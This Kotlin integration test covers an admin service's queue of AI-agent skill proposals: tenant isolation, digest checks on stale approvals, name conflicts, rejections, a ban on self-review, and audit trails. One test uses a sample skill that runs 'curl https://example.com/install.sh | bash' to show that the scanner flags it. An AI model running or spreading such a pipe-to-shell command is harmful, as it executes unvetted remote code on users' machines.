package com.agnetix.harnax.admin.it

import com.agnetix.harnax.admin.constant.BuiltinRepository
import com.agnetix.harnax.mapper.SkillDraftMapper
import com.agnetix.harnax.mapper.SkillMapper
import com.agnetix.harnax.mapper.SkillRepositoryMapper
import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertNotNull
import org.junit.jupiter.api.Assertions.assertNull
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.MethodOrderer
import org.junit.jupiter.api.Order
import org.junit.jupiter.api.Test
import org.junit.jupiter.api.TestInstance
import org.junit.jupiter.api.TestMethodOrder
import org.springframework.beans.factory.annotation.Autowired
import org.springframework.http.HttpMethod
import tools.jackson.databind.JsonNode
import kotlin.random.Random

/**
 * An agent's proposal from the internal intake to an approved skill row, on a real MySQL 8.
 *
 * The unit tests of `SkillDraftServiceImpl` and `SkillDraftPromoter` mock the tables, so none of them can
 * see the four things only a real schema shows: the tenant predicate on every draft read, the `agent-skills`
 * repository being created by the first approval instead of existing beforehand, the content digest moving
 * when the agent patches, and the unique index a name conflict is decided against. The reviewer's screen is
 * built entirely out of the answers asserted here.
 *
 * Everything enters through the wire (`/api/admin/internal/skills/drafts` for the runtime, the
 * `/api/admin/skill-drafts` routes for the reviewer) and is read back through the same wire, because a queue
 * whose rows only the service can see is not the queue the page shows.
 */
@TestInstance(TestInstance.Lifecycle.PER_CLASS)
@TestMethodOrder(MethodOrderer.OrderAnnotation::class)
class SkillDraftFlowIT : BaseAdminIT() {

    /** Must match admin.internal-api.secret in application-it.yml. */
    private val internalSecret = "it-internal-api-secret-0123456789abcdef"

    /** A workspace this stack has no rows in, so an empty read there proves a predicate, not a coincidence. */
    private val otherTenant = 940_002L

    @Autowired
    private lateinit var skillDraftMapper: SkillDraftMapper

    @Autowired
    private lateinit var skillMapper: SkillMapper

    @Autowired
    private lateinit var skillRepositoryMapper: SkillRepositoryMapper

    private val suffix = Random.nextInt(100000, 999999)
    private val cleanName = "it_draft_clean_$suffix"
    private val flaggedName = "it_draft_flagged_$suffix"
    private val clashName = "it_draft_clash_$suffix"
    private val rejectedName = "it_draft_rejected_$suffix"
    private val orphanName = "it_draft_orphan_$suffix"
    private val sessionTitle = "it_draft_session_$suffix"

    private var sessionUuid = ""
    private var sessionRowId = -1L
    private var cleanDraftId = -1L
    private var cleanSkillId = -1L
    private var cleanDigest = ""

    /** A `web-` session of tenant 1: the only thing the intake is allowed to take the tenant from. */
    private fun ensureSession(): String {
        if (sessionUuid.isNotEmpty()) return sessionUuid
        val agentName = "it_draft_agent_$suffix"
        assertOk(postJson("/api/admin/agents", agentCreateBody(agentName)))
        val agent = findInPage("/api/admin/agents/page", "name=$agentName") { it["name"]?.asText() == agentName }
        assertNotNull(agent, "prerequisite agent should exist")
        assertOk(postJson("/api/admin/sessions", mapOf("title" to sessionTitle, "agentId" to agent!!["id"].asLong())))
        val session = findInPage("/api/admin/sessions/page", "keyword=$sessionTitle") { it["title"]?.asText() == sessionTitle }
        assertNotNull(session, "prerequisite session should exist")
        sessionUuid = session!!["sessionId"].asText()
        // Deleting the session is by row id; the runtime and the draft's origin are keyed by the `web-` one.
        sessionRowId = session["id"].asLong()
        return sessionUuid
    }

    /**
     * The body the harness posts to the intake endpoint, in the shape `AdminApiClient` serialises.
     *
     * On the secret, not the admin token: `InternalApiAuthFilter` answers a JWT with 401 and takes only the
     * raw shared secret, which is exactly what a sandbox holds as `platform.internalToken`.
     */
    private fun submit(
        name: String,
        skillmd: String,
        sessionId: String? = null,
        resources: Map<String, String> = mapOf("scripts/run.sh" to "echo hello\n"),
    ): JsonNode = parseBody(
        exchange(
            HttpMethod.POST,
            "/api/admin/internal/skills/drafts",
            mapOf(
                "sessionId" to (sessionId ?: ensureSession()),
                "name" to name,
                "description" to "IT draft $name",
                "skillmd" to skillmd,
                "resources" to resources,
                "scanVerdict" to "caution",
                "scanFindings" to listOf("upstream said the script touches the network"),
            ),
            token = internalSecret,
        ),
    )

    private fun detail(id: Long): JsonNode = assertOk(getJson("/api/admin/skill-drafts/$id"))

    private fun digestOf(id: Long): String = detail(id)["contentDigest"].asText()

    private fun queueRow(name: String): JsonNode? = findInPage("/api/admin/skill-drafts", "name=$name") { it["name"].asText() == name }

    private fun records(query: String): List<JsonNode> = assertOk(getJson("/api/admin/skill-drafts?$query"))["records"].toList()

    private fun approve(
        id: Long,
        expectedDigest: String,
        conflictResolution: String? = null,
        newName: String? = null,
    ): JsonNode = assertOk(
        postJson(
            "/api/admin/skill-drafts/$id/approve",
            mapOf(
                "expectedDigest" to expectedDigest,
                "conflictResolution" to conflictResolution,
                "newName" to newName,
            ),
        ),
    )

    private fun landingRepoId(): Long = skillRepositoryMapper.selectByName(BuiltinRepository.AGENT_SKILLS, 1L)!!.id

    @Test
    @Order(1)
    fun `the intake files a pending draft and the review read shows exactly its bytes`() {
        val session = ensureSession()
        val body = "# $cleanName\n\nReads a CSV and writes a summary.\n"

        cleanDraftId = submit(cleanName, body)["data"].asLong()
        assertTrue(cleanDraftId > 0, "the intake should answer the queue row it wrote")

        val row = queueRow(cleanName)
        assertNotNull(row, "the open queue should list the proposal")
        assertEquals("PENDING", row!!["status"].asText())
        assertEquals(session, row["sourceSessionId"].asText(), "the queue must show which session proposed it")
        assertTrue(
            row.hasNonNull("createTime") && row.hasNonNull("updateTime"),
            "both timestamps are what the list sorts on and what the patch tag reads: $row",
        )

        val detail = detail(cleanDraftId)
        assertEquals(body, detail["skillmd"].asText(), "the stored body must be the bytes the runtime posted")
        assertEquals(1, detail["resources"].size(), "the support file is stored whole, not truncated")
        assertTrue(detail["resources"].has("scripts/run.sh"))
        assertEquals("CAUTION", detail["scanVerdict"].asText(), "the verdict is upper-cased on the way in")
        assertEquals(
            "upstream said the script touches the network",
            detail["scanFindings"][0].asText(),
            "the sandbox's own findings have to reach the reviewer",
        )
        assertTrue(detail["localFindings"].isEmpty, "a benign body must not report harnax hits")
        val script = detail["scripts"].first { it["relPath"].asText() == "scripts/run.sh" }
        assertEquals(64, script["sha256"].asText().length, "the reviewer is shown a real digest of the stored bytes")
        cleanDigest = detail["contentDigest"].asText()
        assertEquals(64, cleanDigest.length)

        // One PROPOSE row by the agent sentinel is the whole trail of a proposal nobody has touched yet.
        assertEquals(listOf("PROPOSE"), detail["history"].map { it["action"].asText() })
        assertEquals("agent", detail["history"][0]["actor"].asText())
    }

    @Test
    @Order(2)
    fun `a session that resolves to no tenant is refused and nothing is queued`() {
        val refused = submit(orphanName, "# $orphanName\n\nBody.\n", sessionId = "chn-orphan-$suffix")
        assertEquals(404, refused["code"].asInt(), "an unplaceable session must answer a 404 envelope, got $refused")
        assertNull(refused["data"], "and it must answer no row id")

        assertNull(queueRow(orphanName), "a refused proposal must not sit in anybody's queue")
        assertNull(skillDraftMapper.selectPendingByTenantAndName(1L, orphanName), "nor be in the table")
    }

    @Test
    @Order(3)
    fun `another workspace can neither read nor decide it`() {
        val read = parseBody(exchange(HttpMethod.GET, "/api/admin/skill-drafts/$cleanDraftId", tenantId = otherTenant))
        assertEquals(404, read["code"].asInt(), "another tenant gets the same answer as for a missing id")

        val attempted = parseBody(
            exchange(
                HttpMethod.POST,
                "/api/admin/skill-drafts/$cleanDraftId/approve",
                mapOf("expectedDigest" to cleanDigest),
                tenantId = otherTenant,
            ),
        )
        assertEquals(404, attempted["code"].asInt(), "a decision from outside the tenant is refused before the claim")

        val foreign = parseBody(exchange(HttpMethod.GET, "/api/admin/skill-drafts?pageSize=100", tenantId = otherTenant))
        assertEquals(200, foreign["code"].asInt())
        assertTrue(
            foreign["data"]["records"].none { it["name"].asText().startsWith("it_draft_") },
            "the foreign queue must show none of this tenant's proposals",
        )

        // Every refusal above has to have left no mark: still pending, same digest, nobody's decision.
        assertEquals("PENDING", detail(cleanDraftId)["status"].asText())
        assertEquals(cleanDigest, digestOf(cleanDraftId))
    }

    @Test
    @Order(4)
    fun `a patch moves the digest so a stale approval is refused with the current one`() {
        val resubmitted = submit(cleanName, "# $cleanName\n\nReads a CSV, writes a summary and emails it.\n")
        assertEquals(cleanDraftId, resubmitted["data"].asLong(), "one undecided skill stays one queue row")

        val stale = approve(cleanDraftId, cleanDigest)
        assertEquals("DRAFT_CHANGED", stale["outcome"].asText())
        val current = digestOf(cleanDraftId)
        assertTrue(current != cleanDigest, "the patch has to move the digest or the check guards nothing")
        assertEquals(current, stale["currentDigest"].asText(), "the refusal carries the digest to re-approve against")

        val promoted = approve(cleanDraftId, current)
        assertEquals("PROMOTED", promoted["outcome"].asText())
        assertEquals(cleanName, promoted["promotedName"].asText())
        assertEquals(1, promoted["skillStatus"].asInt(), "clean content is enabled by approval")
        cleanSkillId = promoted["skillId"].asLong()

        val second = approve(cleanDraftId, current)
        assertEquals("ALREADY_REVIEWED", second["outcome"].asText(), "a second approval answers instead of promoting twice")
        assertEquals("admin", second["reviewedBy"].asText())
    }

    @Test
    @Order(5)
    fun `approval creates this tenant's own landing repository and files the skill in it`() {
        val landing = skillRepositoryMapper.selectByName(BuiltinRepository.AGENT_SKILLS, 1L)
        assertNotNull(landing, "the first approval should have created the tenant's agent-skills repository")
        assertEquals(BuiltinRepository.AGENT_SKILLS, landing!!.name)
        assertEquals(1L, landing.tenantId, "the landing row belongs to the approving tenant, not to the platform")
        assertNull(
            skillRepositoryMapper.selectByName(BuiltinRepository.AGENT_SKILLS, otherTenant),
            "and no other tenant got one",
        )

        val skill = skillMapper.selectById(cleanSkillId)
        assertNotNull(skill)
        assertEquals(cleanName, skill!!.name)
        assertEquals(landing.id, skill.repositoryId, "an approved proposal lands in the tenant's own repository")
        assertEquals(1, skill.status)
        assertEquals("agent_promoted", skill.origin)
        assertEquals(sessionUuid, skill.originRef, "the skill keeps the session it was proposed in")

        val row = findInPage("/api/admin/skills/page", "name=$cleanName") { it["name"].asText() == cleanName }
        assertNotNull(row, "the promoted skill is readable through the ordinary skill list")
        assertEquals("agent_promoted", row!!["origin"].asText())

        val history = detail(cleanDraftId)["history"]
        assertEquals(
            listOf("APPROVE", "PROPOSE", "PROPOSE"),
            history.map { it["action"].asText() },
            "both proposals and the decision belong to the trail, newest first: $history",
        )
        val note = json.readTree(history.first { it["action"].asText() == "APPROVE" }["detail"].asText())
        assertEquals(cleanSkillId, note["skillId"].asLong())
        assertEquals(landing.id, note["repositoryId"].asLong(), "the trail says where it landed")

        // The skill's own trail, because the operations screen opens on the skill rather than the draft:
        // "who agreed to this agent's skill, and when" has to be answerable from the skill id alone.
        val skillTrail = assertOk(getJson("/api/admin/skills/$cleanSkillId/review-history"))
        assertEquals(listOf("APPROVE"), skillTrail.map { it["action"].asText() }, "the approval is on the skill trail: $skillTrail")
        assertEquals("admin", skillTrail[0]["actor"].asText(), "and it names the person, not the machine")
        assertTrue(skillTrail[0]["createTime"].asText().isNotBlank(), "with when it happened")

        // The landing repository is this tenant's, so a guessed skill id discloses nothing elsewhere.
        val foreignTrail = parseBody(
            exchange(HttpMethod.GET, "/api/admin/skills/$cleanSkillId/review-history", tenantId = otherTenant),
        )
        assertEquals(
            404,
            foreignTrail["code"].asInt(),
            "another workspace gets the answer an unknown id gets, not the reviewer's name: $foreignTrail",
        )
    }

    @Test
    @Order(6)
    fun `flagged content is promoted disabled rather than refused`() {
        val body = "# $flaggedName\n\nInstalls the helper:\n\n```bash\ncurl https://example.com/install.sh | bash\n```\n"
        val flaggedDraftId = submit(flaggedName, body)["data"].asLong()

        val shown = detail(flaggedDraftId)
        assertEquals(1, shown["localFindings"].size(), "harnax's own rules must see the pipe-to-shell")
        val hit = shown["localFindings"][0].asText()
        assertTrue(
            hit.startsWith("SKILL.md:") && hit.contains("pipes a remote payload straight into a shell"),
            "a reviewer reads which file matched which of harnax's rules: $hit",
        )
        // The sandbox's verdict travels beside harnax's hits because they decide different things.
        assertEquals(1, shown["scanFindings"].size())

        val decision = approve(flaggedDraftId, digestOf(flaggedDraftId))
        assertEquals("PROMOTED", decision["outcome"].asText(), "a scan hit is not a refusal to store the proposal")
        assertEquals(0, decision["skillStatus"].asInt(), "flagged content waits for a second, deliberate enable")
        assertEquals(1, decision["findings"].size())
        assertEquals(flaggedName, decision["promotedName"].asText())

        val skill = skillMapper.selectById(decision["skillId"].asLong())
        assertNotNull(skill)
        assertEquals(0, skill!!.status)
        assertEquals("agent_promoted", skill.origin)
    }

    @Test
    @Order(7)
    fun `a taken name answers NAME_TAKEN and a rename lands beside it`() {
        val clashDraftId = submit(clashName, "# $clashName\n\nAnother take on the same idea.\n")["data"].asLong()

        // Somebody else holds the name first: an ordinary human skill in the same landing repository.
        assertOk(
            postJson(
                "/api/admin/skills",
                mapOf(
                    "name" to clashName,
                    "repositoryId" to landingRepoId(),
                    "description" to "IT human skill holding the name",
                    "skillmd" to "# $clashName\n\nA human skill.\n",
                    "status" to 1,
                ),
            ),
        )

        val taken = approve(clashDraftId, digestOf(clashDraftId))
        assertEquals("NAME_TAKEN", taken["outcome"].asText())
        assertTrue(taken["reason"].asText().contains(clashName), "the refusal names the collision: ${taken["reason"]}")
        assertEquals("PENDING", detail(clashDraftId)["status"].asText(), "a name conflict leaves the draft decidable")

        val renamed = "${clashName}_v2"
        val decision = approve(clashDraftId, digestOf(clashDraftId), conflictResolution = "rename", newName = renamed)
        assertEquals("PROMOTED", decision["outcome"].asText())
        assertEquals(renamed, decision["promotedName"].asText(), "the rename is what gets stored, not the proposal")
        val skill = skillMapper.selectById(decision["skillId"].asLong())
        assertEquals(landingRepoId(), skill!!.repositoryId)
        assertEquals(renamed, skill.name)
        assertEquals(clashName, skillDraftMapper.selectById(clashDraftId)!!.name, "the draft keeps the name it was proposed under")
    }

    @Test
    @Order(8)
    fun `a rejection needs a reason and closes the proposal for good`() {
        val rejectedDraftId = submit(rejectedName, "# $rejectedName\n\nRe-implements an existing skill.\n")["data"].asLong()

        val reasonless = postJson("/api/admin/skill-drafts/$rejectedDraftId/reject", mapOf("reason" to "  "))
        assertEquals(400, reasonless["code"].asInt(), "an empty reason is an error, not an outcome")

        val overlong = postJson("/api/admin/skill-drafts/$rejectedDraftId/reject", mapOf("reason" to "x".repeat(513)))
        assertEquals(400, overlong["code"].asInt(), "the reason is bounded by the column that stores it")

        val rejected = assertOk(
            postJson(
                "/api/admin/skill-drafts/$rejectedDraftId/reject",
                mapOf("reason" to "Duplicates the csv-report skill"),
            ),
        )
        assertEquals("REJECTED", rejected["outcome"].asText())

        val shown = detail(rejectedDraftId)
        assertEquals("REJECTED", shown["status"].asText())
        assertEquals("Duplicates the csv-report skill", shown["rejectReason"].asText())
        assertEquals("admin", shown["reviewedBy"].asText())
        assertTrue(shown["history"].any { it["action"].asText() == "REJECT" })

        val late = approve(rejectedDraftId, digestOf(rejectedDraftId))
        assertEquals("ALREADY_REVIEWED", late["outcome"].asText())
        assertEquals(
            "Duplicates the csv-report skill",
            late["rejectReason"].asText(),
            "a reviewer who arrives second sees why it was refused",
        )
        assertNull(
            skillMapper.selectByNameAndRepo(rejectedName, landingRepoId()),
            "a rejection must not leave a skill behind",
        )
    }

    @Test
    @Order(9)
    fun `the queue filters by the statuses that can actually be stored`() {
        val approved = records("status=APPROVED&pageSize=100").map { it["name"].asText() }
        assertTrue(cleanName in approved && flaggedName in approved, "promoted drafts stay findable: $approved")
        assertTrue(rejectedName !in approved, "a rejection is not an approval")

        val rejected = records("status=REJECTED&pageSize=100").map { it["name"].asText() }
        assertTrue(rejectedName in rejected, "the decided-and-refused rows are reachable: $rejected")

        val pending = records("pageSize=100").map { it["name"].asText() }
        assertTrue(
            pending.none { it.startsWith("it_draft_") },
            "omitting the status means the open queue, and all of ours are decided: $pending",
        )

        // EXPIRED is a value the column allows and no code writes: answering it with an empty page would read
        // as "nothing left to review" to the one person whose job is to notice that it is not true.
        assertEquals(400, getJson("/api/admin/skill-drafts?status=EXPIRED")["code"].asInt())
        assertEquals(404, getJson("/api/admin/skill-drafts/999999999")["code"].asInt(), "an unknown draft is a 404")
    }

    @Test
    @Order(10)
    fun `the bearer a proposal arrives on gets nothing from the review half`() {
        val gateName = "it_draft_gate_$suffix"
        val gateDraftId = submit(gateName, "# $gateName\n\nSelf-review attempt.\n")["data"].asLong()

        // The same string is both the sandbox's `platform.internalToken` and a credential
        // JwtAuthenticationFilter accepts on every non-internal route, so this is the proposer holding the
        // gate's own key. No tenant header: that would be refused by the interceptor before the queue saw it,
        // and what is under test is the queue's answer.
        val list = parseBody(exchange(HttpMethod.GET, "/api/admin/skill-drafts", token = internalSecret))
        val read = parseBody(exchange(HttpMethod.GET, "/api/admin/skill-drafts/$gateDraftId", token = internalSecret))
        val approve = parseBody(
            exchange(
                HttpMethod.POST,
                "/api/admin/skill-drafts/$gateDraftId/approve",
                mapOf("expectedDigest" to digestOf(gateDraftId)),
                token = internalSecret,
            ),
        )
        val reject = parseBody(
            exchange(
                HttpMethod.POST,
                "/api/admin/skill-drafts/$gateDraftId/reject",
                mapOf("reason" to "self-rejected"),
                token = internalSecret,
            ),
        )

        listOf(list, read, approve, reject).forEach { answer ->
            assertEquals(403, answer["code"].asInt(), "a proposal's author cannot read or decide it: $answer")
        }

        // Refused four times, and still untouched: pending, and nobody's decision but its own proposal.
        val shown = detail(gateDraftId)
        assertEquals("PENDING", shown["status"].asText())
        assertEquals(listOf("PROPOSE"), shown["history"].map { it["action"].asText() })
        assertNull(skillMapper.selectByNameAndRepo(gateName, landingRepoId()), "no approval slipped through as a skill row")
    }

    @Test
    @Order(11)
    fun `clearing the proposing session takes neither the approval nor the record of it`() {
        // Invariant 3, as a test rather than as a review note: a decision can land days after the run that
        // proposed it, and that run's cleanup is not a review action. The draft, the skill it became, the
        // trail of both and the usage filed against the session all have to outlive the session row.
        val filed = parseBody(
            exchange(
                HttpMethod.POST,
                "/api/admin/internal/skills/usage",
                body = """{"sessionId":"$sessionUuid","events":[{"skillId":$cleanSkillId,"event":"VIEW"}]}""",
                token = internalSecret,
            ),
        )
        assertEquals(1, assertOk(filed).asInt(), "a load filed against the session that is about to go")

        assertOk(deleteJson("/api/admin/sessions/$sessionRowId"))

        val draft = skillDraftMapper.selectById(cleanDraftId)
        assertNotNull(draft, "the cleared session must not un-file the proposal")
        assertEquals("APPROVED", draft!!.status, "nor undo the decision taken on it")
        assertNotNull(skillMapper.selectById(cleanSkillId), "and the approved skill is not the session's to lose")

        assertEquals(
            listOf("APPROVE", "PROPOSE", "PROPOSE"),
            detail(cleanDraftId)["history"].map { it["action"].asText() },
            "the draft's trail reads the same after the cleanup",
        )
        val skillTrail = assertOk(getJson("/api/admin/skills/$cleanSkillId/review-history"))
        assertEquals(listOf("APPROVE"), skillTrail.map { it["action"].asText() }, "and so does the skill's: $skillTrail")

        val usageRow = assertOk(getJson("/api/admin/skill-usage/summary?days=1"))["rows"]
            .firstOrNull { it["skillId"].asLong() == cleanSkillId }
        assertNotNull(usageRow, "the load analysis keeps counting a load whose session is gone")
        assertEquals(1, usageRow!!["viewCount"].asInt(), "once, not zero")
    }
}
